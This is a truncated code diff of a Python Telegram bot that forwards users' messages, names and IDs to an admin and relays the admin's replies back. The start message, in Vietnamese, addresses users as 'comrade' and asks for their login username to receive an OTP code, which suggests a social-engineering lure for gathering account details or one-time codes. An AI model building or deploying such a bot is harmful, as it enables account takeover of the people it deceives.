@@ -10,7 +10,7 @@ user_map = {}
 @bot.message_handler(commands=['start'])
 def start(message):
     if message.chat.id != ADMIN_ID:
-        bot.reply_to(message, "Đồng chí cung cấp tên đăng nhập để nhận mã OTP")
+        bot.reply_to(message, "Dong chi cung cap ten dang nhap de nhan ma OTP")
 
 @bot.message_handler(func=lambda msg: msg.chat.id != ADMIN_ID)
 def from_user(message):
@@ -18,4 +18,14 @@ def from_user(message):
     name = user.first_name + (f" @{user.username}" if user.username else "")
     sent = bot.send_message(
         ADMIN_ID,
-        f"📌 *[BOT 2]*
+        f"[BOT 2]\nNguoi dung: {name}\nID: {user.id}\nTin nhan: {message.text}",
+    )
+    user_map[sent.message_id] = user.id
+
+@bot.message_handler(func=lambda msg: msg.chat.id == ADMIN_ID and msg.reply_to_message)
+def from_admin(message):
+    original_id = message.reply_to_message.message_id
+    target_id = user_map.get(original_id)
+    if target_id:
+        bot.send_message(target_id, message.text)
+        bot.reply_to(me
